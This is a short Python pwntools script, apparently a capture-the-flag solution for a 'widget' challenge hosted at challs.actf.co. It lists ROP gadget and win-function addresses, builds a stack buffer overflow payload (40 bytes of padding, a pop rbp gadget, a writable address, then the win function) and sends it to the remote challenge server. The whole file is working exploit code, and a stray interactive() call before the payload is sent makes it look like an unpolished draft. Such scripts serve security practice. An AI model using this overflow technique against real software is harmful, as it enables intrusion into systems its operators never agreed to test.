from pwn import *

# 14571414c5d9fe9ed0698ef21065d8a6
# willy_wonka_widget_factory

# Gadgets
main_func = 0x00000000004013d9
win_func = 0x000000000040130b
called = 0x40402c
writable = 0x404500
pop_rbp = 0x000000000040127d

# Libc
pop_rdi = 0x000000000002a3e5
pop_rsi = 0x000000000002be51

#io = process('./widget')
#gdb.attach(io, api=True)
io = remote('challs.actf.co', 31320)
#payload = fmtstr_payload(8, {called:0})
print(io.recvuntil(b'solution: ').decode())
io.interactive()
payload = b'a'*40
payload += p64(pop_rbp) + p64(writable)
payload += p64(win_func)
print(len(payload))
#io.recvuntil(b': ')
io.sendline(f'{len(payload)}'.encode())
io.recvuntil(b': ')
io.sendline(payload)
io.interactive()